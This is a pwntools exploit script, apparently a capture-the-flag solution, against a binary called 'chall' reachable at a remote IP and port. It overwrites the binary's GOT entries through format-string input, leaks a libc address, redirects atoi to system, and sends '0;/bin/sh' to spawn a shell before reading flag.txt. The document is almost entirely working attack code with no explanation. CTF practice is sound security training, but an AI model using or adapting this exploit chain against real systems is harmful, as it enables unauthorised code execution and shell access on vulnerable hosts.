#!/usr/bin/python3

from pwn import *

elf = ELF('chall', checksec=False)
context.arch = elf.arch
context.binary = elf
context.terminal = ["terminator", "-u", "-e"]

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			"b *main+213",
			# "b main",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("65.21.255.31", 33710)
	else:
		return process(elf.path, env=env)

p = get_conn()
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)
cl = lambda: p.clean(timeout=1)

libc = ELF('./libc.so.6')

# overwrite exit with main and atoi with printf

sa(b'size: ', b'9$sAAAAA' + p64(elf.got["atoi"]-1))
sla(b'data: ', flat(
	0x401050, # elf.symbols["printf"],
	0x4010a0, # elf.symbols["__isoc99_scanf"],
	elf.symbols["main"],
	0x4010c0, # elf.symbols["__ctype_b_loc"]
))

atoi_got = 0x404048
off = 1688512
system = 0x0000000000052290

# 91 - stack leak
sla(b'size: ', b'1%21$pAA' + p64(elf.got["atoi"]-1))

libc_leak = ru(b'AA') 
libc_leak = int(libc_leak[1:], 16)
ls(f'libc_leak {hex(libc_leak)}')

libc_base = libc_leak - 0x24083
libc.address = libc_base
ls(f'libc_base {hex(libc_base)}')


# overwrite atoi with system
sa(b'size: ', b'9$sAAAAA' + p64(elf.got["atoi"]-1))
sla(b'data: ', flat(
	libc.symbols['system'], # elf.symbols["printf"],
	0x4010a0, # elf.symbols["__isoc99_scanf"],
	elf.symbols["main"],
	0x4010c0, # elf.symbols["__ctype_b_loc"]
))

sa(b'size: ', b'0;/bin/sh'.ljust(16, b'\x00'))
sleep(1)
sl(b'cat flag.txt')

ia()



